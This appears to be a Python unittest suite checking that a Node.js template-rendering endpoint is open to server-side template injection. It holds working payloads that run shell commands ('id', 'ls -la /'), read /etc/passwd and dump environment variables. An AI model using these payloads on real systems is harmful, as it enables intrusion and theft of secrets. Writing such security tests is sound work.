import base64
import json
import logging
import os
import socket
import threading
import time
import unittest
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',  # More detailed format
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# Disable noisy loggers
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Load environment variables
load_dotenv()

# Configuration
API_URL = os.getenv('API_URL', 'http://localhost:3001')
TEST_PORT = int(os.getenv('TEST_PORT', '8889'))
TEST_HOST = os.getenv('TEST_HOST', '0.0.0.0')
TEST_NETWORK_TIMEOUT = int(os.getenv('TEST_NETWORK_TIMEOUT', '5000'))
TEST_NETWORK_RETRIES = int(os.getenv('TEST_NETWORK_RETRIES', '3'))

class TestHTTPHandler(BaseHTTPRequestHandler):
    test_marker = None

    def do_GET(self):
        logger.debug(f"[TestServer] Received request: {self.path}")
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        response = f"Test Response: {self.test_marker}"
        self.wfile.write(response.encode())

    def log_message(self, format, *args):
        # Suppress logs
        pass

class TestServer:
    def __init__(self, test_marker):
        self.server = HTTPServer((TEST_HOST, TEST_PORT), TestHTTPHandler)
        TestHTTPHandler.test_marker = test_marker
        self.thread = None

    def start(self):
        logger.info(f"Starting test server on {TEST_HOST}:{TEST_PORT}")
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()

        # Wait for server to start
        self._wait_for_server()

    def _wait_for_server(self, timeout=5):
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.create_connection((TEST_HOST, TEST_PORT), timeout=1):
                    logger.info("Test server is ready")
                    return True
            except (socket.timeout, ConnectionRefusedError):
                time.sleep(0.1)
        raise TimeoutError("Server failed to start within timeout")

    def stop(self):
        logger.info("Stopping test server")
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        if self.thread:
            self.thread.join()

class TestSSTI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        logger.info("\nSetting up SSTI test environment...")
        cls.test_marker = str(uuid.uuid4())
        cls.server = TestServer(cls.test_marker)
        cls.server.start()

        # Wait for application server to be ready
        cls._wait_for_app_server()

    @classmethod
    def _wait_for_app_server(cls, timeout=30, interval=1):
        """Wait for application server to be ready"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                # Try the template endpoint directly instead of health
                response = requests.post(f"{API_URL}/api/template/render", json={
                    'template': 'test',
                    'data': {}
                })
                if response.status_code in [200, 400, 500]:  # Any response means server is up
                    logger.info("Application server is ready")
                    return True
            except requests.exceptions.RequestException:
                time.sleep(interval)
        raise TimeoutError("Application server failed to start within timeout")

    @classmethod
    def tearDownClass(cls):
        logger.info("\nCleaning up SSTI test environment...")
        cls.server.stop()

    def _make_request(self, method, url, **kwargs):
        """Helper method to make requests with retries"""
        retries = TEST_NETWORK_RETRIES
        timeout = TEST_NETWORK_TIMEOUT / 1000  # Convert to seconds

        for attempt in range(retries):
            try:
                response = requests.request(method, url, timeout=timeout, **kwargs)
                return response
            except requests.exceptions.RequestException as e:
                if attempt == retries - 1:
                    raise
                logger.warning(f"Request failed (attempt {attempt + 1}/{retries}): {e}")
                time.sleep(1)

    def test_01_template_endpoints_exist(self):
        """Test that all required template endpoints exist"""
        # Test template creation
        response = self._make_request('POST', f"{API_URL}/api/template", json={
            'name': 'Test Template',
            'content': 'Hello ${name}!'
        })
        self.assertEqual(response.status_code, 200, "Template creation endpoint should exist")

        # Get template ID from response
        template_id = response.json().get('id')
        self.assertIsNotNone(template_id, "Template creation should return an ID")

        # Test template retrieval
        response = self._make_request('GET', f"{API_URL}/api/template/{template_id}")
        self.assertEqual(response.status_code, 200, "Template retrieval endpoint should exist")

        # Test template rendering
        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': 'Hello ${name}!',
            'data': {'name': 'test'}
        })
        self.assertEqual(response.status_code, 200, "Template rendering endpoint should exist")

    def test_02_basic_template_rendering(self):
        """Test basic template rendering functionality"""
        test_name = str(uuid.uuid4())
        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': 'Hello ${name}!',
            'data': {'name': test_name}
        })
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()['result'], f'Hello {test_name}!')

    def test_03_code_execution(self):
        """Test code execution via template"""
        marker = str(uuid.uuid4())

        # Test basic command execution first
        template = f'${{(() => require("child_process").execSync("echo {marker}").toString())()}}'
        logger.info("="*60)
        logger.info("Testing command execution")
        logger.info(f"Template: {template}")

        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': template,
            'data': {}
        })
        self.assertEqual(response.status_code, 200)
        result = response.json()['result']
        logger.info(f"Command 'echo' result:\n{result}")
        self.assertIn(marker, result)

        # Test user context with 'id' command
        template = '${(() => require("child_process").execSync("id").toString())()}'
        logger.info("\nTesting user context")
        logger.info(f"Template: {template}")

        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': template,
            'data': {}
        })
        self.assertEqual(response.status_code, 200)
        result = response.json()['result']
        logger.info(f"Command 'id' result:\n{result}")
        self.assertIn('uid=', result)

        # Test process info access
        template = '${(() => process.pid)()}'
        logger.info("\nTesting process info access")
        logger.info(f"Template: {template}")

        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': template,
            'data': {}
        })
        self.assertEqual(response.status_code, 200)
        result = response.json()['result']
        logger.info(f"Process PID: {result}")
        self.assertTrue(result.isdigit())
        logger.info("="*60)

    def test_04_file_system_access(self):
        """Test file system access via template"""
        logger.info("="*60)
        logger.info("Testing file system access")

        # Test reading sensitive file (/etc/passwd)
        template = '${(() => require("fs").readFileSync("/etc/passwd", "utf8"))()}'
        logger.info(f"Template: {template}")

        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': template,
            'data': {}
        })
        self.assertEqual(response.status_code, 200)
        result = response.json()['result']
        logger.info(f"File /etc/passwd contents:\n{result}")
        self.assertIn('root:', result)
        logger.info("="*60)

    # def test_05_network_access(self):
    #     """Test network access via template"""
    #     # Test HTTP request
    #     response = self._make_request('POST', f"{API_URL}/api/template/render", json={
    #         'template': f'''${{(() => {{
    #             const http = require("http");
    #             const url = "http://{TEST_HOST}:{TEST_PORT}/test-ssti";
    #             return new Promise((resolve) => {{
    #                 http.get(url, (res) => {{
    #                     let data = "";
    #                     res.on("data", (chunk) => data += chunk);
    #                     res.on("end", () => resolve(data));
    #                 }}).on("error", (err) => resolve("Error: " + err.message));
    #             }}).then(result => result);
    #         }})()}}''',
    #         'data': {}
    #     })
    #     self.assertEqual(response.status_code, 200)
    #     result = response.json()['result']
    #     if not result.startswith('Error:'):
    #         self.assertIn(self.test_marker, result)

    def test_06_sensitive_data_access(self):
        """Test accessing sensitive application data"""
        logger.info("="*60)
        logger.info("Testing access to sensitive information")

        # Read environment variables
        template = '${(() => JSON.stringify(process.env, null, 2))()}'
        logger.info("\nTesting environment variables access")
        logger.info(f"Template: {template}")

        response = self._make_request('POST', f"{API_URL}/api/template/render", json={
            'template': template,
            'data': {}
        })
        self.assertEqual(response.status_code, 200)
        result = response.json()['result']
        logger.info(f"Environment variables:\n{result}")

        # Verify we got actual environment data
        env_obj = json.loads(result)
        self.assertTrue('PATH' in env_obj, "Should contain PATH environment variable")
        self.assertTrue('HOME' in env_obj, "Should contain HOME environment variable")

        # Additional tests from root test_ssti.py
        logger.info("\nTesting Node.js process info access")
        response = self._make_request(
            "POST",
            f"{API_URL}/api/template/render",
            json={
                "template": "${(() => JSON.stringify({env: process.env, version: process.version, arch: process.arch, platform: process.platform}))()}",
                "data": {},
            },
        )
        self.assertEqual(response.status_code, 200)
        result = response.json()["result"]
        logger.info(f"Node.js process info:\n{result}")

        # List root directory
        logger.info("\nTesting root directory listing")
        response = self._make_request(
            "POST",
            f"{API_URL}/api/template/render",
            json={
                "template": '${(() => require("child_process").execSync("ls -la /").toString())()}',
                "data": {},
            },
        )
        self.assertEqual(response.status_code, 200)
        result = response.json()["result"]
        logger.info(f"Root directory contents:\n{result}")

        # Get memory info
        logger.info("\nTesting memory info access")
        response = self._make_request(
            "POST",
            f"{API_URL}/api/template/render",
            json={
                "template": '${(() => require("child_process").execSync("free -m").toString())()}',
                "data": {},
            },
        )
        self.assertEqual(response.status_code, 200)
        result = response.json()["result"]
        logger.info(f"Memory information:\n{result}")

        self.assertTrue(len(result) > 0)
        logger.info("="*60)

if __name__ == '__main__':
    unittest.main()
